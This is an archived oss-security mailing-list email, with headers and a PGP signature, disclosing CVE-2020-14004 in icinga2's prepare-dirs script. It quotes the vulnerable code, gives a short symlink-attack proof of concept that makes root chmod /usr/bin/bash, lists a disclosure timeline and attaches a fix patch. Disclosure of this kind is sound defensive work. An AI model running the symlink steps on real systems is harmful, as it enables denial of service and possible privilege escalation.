X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7045" "Friday" "12" "June" "2020" "11:54:28" "+0200" "Matthias Gerstner" "mgerstner@suse.de" "<20200612095428.GD12592@f195.suse.de>" "194" "[oss-security] icinga2: CVE-2020-14004: prepare-dirs script allows for symlink attack in the icinga user context" nil nil nil "6" "2020061209:54:28" "[oss-security] icinga2: CVE-2020-14004: prepare-dirs script allows for symlink attack in the icinga user context" (number mark "U       mgerstner@su Jun 12  194/7045  " thread-indent "\"[oss-security] icinga2: CVE-2020-14004: prepare-dirs script allows for symlink attack in the icinga user context\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] icinga2: CVE-2020-14004: prepare-dirs script allows for symlink attack in the icinga user context" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1573 invoked by uid 550); 12 Jun 2020 09:54:41 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1552 invoked from network); 12 Jun 2020 09:54:40 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Fri, 12 Jun 2020 11:54:28 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <20200612095428.GD12592@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="DWg365Y4B18r8evw"
Content-Disposition: inline
Subject: [oss-security] icinga2: CVE-2020-14004: prepare-dirs script allows for symlink
 attack in the icinga user context

--DWg365Y4B18r8evw
Content-Type: multipart/mixed; boundary="juZjCTNxrMaZdGZC"
Content-Disposition: inline


--juZjCTNxrMaZdGZC
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

during the review of directories with special permissions in openSUSE
distributions I noticed an icinga user privilege escalation issue in the
icinga2 monitoring software [1].

# Issue Description

The icinga2 systemd service in /usr/lib/systemd/system/icinga2.service
contains the following Start statements:

```
ExecStartPre=3D/usr/lib/icinga2/prepare-dirs /etc/sysconfig/icinga2
ExecStart=3D/usr/sbin/icinga2 daemon --close-stdio -e ${ICINGA2_ERROR_LOG}
```

The prepare-dirs bash script which is executed as root contains - among
other things - the following sequence of commands:

```
if [ ! -e "$ICINGA2_INIT_RUN_DIR" ]; then
        mkdir "$ICINGA2_INIT_RUN_DIR"
        mkdir "$ICINGA2_INIT_RUN_DIR"/cmd
fi

chmod 755 "$ICINGA2_INIT_RUN_DIR"
chmod 2750 "$ICINGA2_INIT_RUN_DIR"/cmd
chown -R $ICINGA2_USER:$ICINGA2_COMMAND_GROUP "$ICINGA2_INIT_RUN_DIR"
```

It is made sure that the /run/icinga2 and /run/icinga2/cmd directories
are existing. Then /run/icinga2/cmd is given a setgid bit. And then
/run/icinga2 is recursively chowned to icinga:icingacmd.

The `chmod 2750 "$ICINGA2_INIT_RUN_DIR"/cmd` line allows the
unprivileged icinga user to perform a symlink attack, if /run/icinga2
already existed before which can for example happen when the icinga2
service is restarted.

Proof of concept on openSUSE Tumbleweed:

```
root# zypper in --no-recommends icinga2
[...]
root# systemctl start icinga2

# simulate a compromised icinga user account
root# sudo -u icinga /bin/bash
icinga# cd /run/icinga2
icinga# rm -rf cmd
# replace the cmd directory by a symlink to a privileged path
icinga# ln -s /usr/bin/bash cmd
# back to root
icinga# exit

# trigger prepare-dirs to be run again
root# sytemctl restart icinga2
# /usr/bin/bash is now of mode 2750
root# ls -lh /usr/bin/bash
-rwxr-s--- 1 root root 1.2M 19. Mai 15:05 /usr/bin/bash
```

This is no full local root exploit as far as I can see. It's lucky
because the mode 02750 doesn't allow `other` to execute the file.
Otherwise it would allow the attacker to gain e.g. root group
permissions. But the attack still allows a denial-of-service by denying
non-root users access to vital system directories. Maybe it could also
be combined with other security issues to gain full root privileges.

Upstream addressed this via commit 2f0f2e8c355b75fa4407d23f85feea037d2bc4b6
[3]. This fix removes the `chmod` lines and uses `mkdir -m <mode>` instead.

My personal long-term suggestion is to replace this directory creation logic
by a systemd-tmpfiles configuration file.

# Remaining aspects

Apart from the `chmod` issue there is still the recursive chown line
`chown -R $ICINGA2_USER:$ICINGA2_COMMAND_GROUP "$ICINGA2_INIT_RUN_DIR"`
left in the script. This is also not ideal. `chown` from GNU coreutils
is not following symlinks. But it could still turn out to be subject to
race conditions on older or alternative `chown` implementations. It
would also be problematic if the Linux kernel hardlink protection is
turned off for some reason.

Upstream does not deem this problematic. I personally suggest to
recursively remove the directory instead, if it is not owned by the
configured user account. A suggested patch can be found in the openSUSE
bug for this issue [2] and is also attached to this email.

# Timeline

2020-05-27: I reported this to the documented upstream security contact
            security@icinga.com.
2020-06-08: I received a reply from upstream pointing me to their already
	    published fix [3], explaining that they don't intend to assign a
            CVE and see no need to fix the recursive `chown -R` line.
2020-06-10: I received a CVE from Mitre to track this issue.

[1]: https://icinga.com/
[2]: https://bugzilla.suse.com/show_bug.cgi?id=3D1172171
[3]: https://github.com/Icinga/icinga2/commit/2f0f2e8c355b75fa4407d23f85fee=
a037d2bc4b6

Cheers

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Phone: +49 911 740 53 290
GPG Key ID: 0x14C405C971923553

SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Felix Imend=F6rffer


--juZjCTNxrMaZdGZC
Content-Type: text/x-diff; charset=us-ascii
Content-Disposition: attachment; filename="prepare-dirs.patch"
Content-Transfer-Encoding: quoted-printable

Index: icinga2-2.11.3/etc/initsystem/prepare-dirs.cmake
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
--- icinga2-2.11.3.orig/etc/initsystem/prepare-dirs.cmake
+++ icinga2-2.11.3/etc/initsystem/prepare-dirs.cmake
@@ -25,14 +25,19 @@ getent passwd $ICINGA2_USER >/dev/null 2
 getent group $ICINGA2_GROUP >/dev/null 2>&1 || (echo "Icinga group '$ICING=
A2_GROUP' does not exist. Exiting." && exit 6)
 getent group $ICINGA2_COMMAND_GROUP >/dev/null 2>&1 || (echo "Icinga comma=
nd group '$ICINGA2_COMMAND_GROUP' does not exist. Exiting." && exit 6)
=20
-if [ ! -e "$ICINGA2_INIT_RUN_DIR" ]; then
-	mkdir "$ICINGA2_INIT_RUN_DIR"
-	mkdir "$ICINGA2_INIT_RUN_DIR"/cmd
+if [ -e "$ICINGA2_INIT_RUN_DIR" ]; then
+	user_group=3D`stat --printf=3D"%U:%G" "$ICINGA2_INIT_RUN_DIR"`
+	if [ "$user_group" !=3D "$ICINGA2_USER:$ICINGA2_COMMAND_GROUP" ]; then
+		# re-create the directory structure below using the correct
+		# user/group
+		rm -rf "$ICINGA2_INIT_RUN_DIR"
+	fi
 fi
=20
-chmod 755 "$ICINGA2_INIT_RUN_DIR"
-chmod 2750 "$ICINGA2_INIT_RUN_DIR"/cmd
-chown -R $ICINGA2_USER:$ICINGA2_COMMAND_GROUP "$ICINGA2_INIT_RUN_DIR"
+if [ ! -e "$ICINGA2_INIT_RUN_DIR" ]; then
+	mkdir -m 755 "$ICINGA2_INIT_RUN_DIR"
+	mkdir -m 2750 "$ICINGA2_INIT_RUN_DIR"/cmd
+fi
=20
 test -e "$ICINGA2_LOG_DIR" || install -m 750 -o $ICINGA2_USER -g $ICINGA2_=
COMMAND_GROUP -d "$ICINGA2_LOG_DIR"
=20

--juZjCTNxrMaZdGZC--

--DWg365Y4B18r8evw
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAl7jUNQACgkQFMQFyXGS
NVPBthAArUlR1MDqu2W4H7/syWvIgCOUJE+Na0OEXCTaqZm/KkCAupdiRIHJeblI
Gp57h1PdUfApKBakxt3+ztyb7nAbXz+2hjLh0+nmcvgfkFd4MFfVJG/cSKavWHkw
VF+ViCvtZ+81oJMRCOSA5YAnY5oE1tG7dZTkIGFPDvkuwcF9C5dR1v/83AizO6p7
4nfYo+lbilRI38ROkS7NSMcD4+NJwhi36+oNMBQXul+aJCdt8J29E1LT6fWBUCgz
sDreRGqgFsTu8U/4GQDB+C54Rq2axTIiLarNN4D8/CZ/MQTEsICPL82JlLUzwakY
J+fMM1lrOcV9aHJDU5BiXCsmzdAbKKzMnKtWw+sE6VJygUi8w5w37FvVAi5n6J4s
cyitbwyfK/x7ghsHeuVerznpxCJ/0BFSlD5ZeBkcsGgPdrkxXpFuTve+aJccJ5Ri
0VEhNlg8tWqimhU9/uvFYI4U2gPoW2oUA2Ov+0uJ2Uoeiu17VSCQSvtHLp2WiBip
HwnIq8OV9SIiGnxByF4B9RMBb7s68p0hFf2aIuKV2HBzg0Lgz261U0VfZvNlQs3q
DL1QLetgYVxs9gqi91PU1xWqGy63iUec/HWI1oQv4+38XM60sH6IF8dkl4kuKksv
NZw2M8Qkdt+xd0A71mJ6Wm3nNSHA0ziY/AiBRgPBMuyMru+gUw4=
=ToAj
-----END PGP SIGNATURE-----

--DWg365Y4B18r8evw--
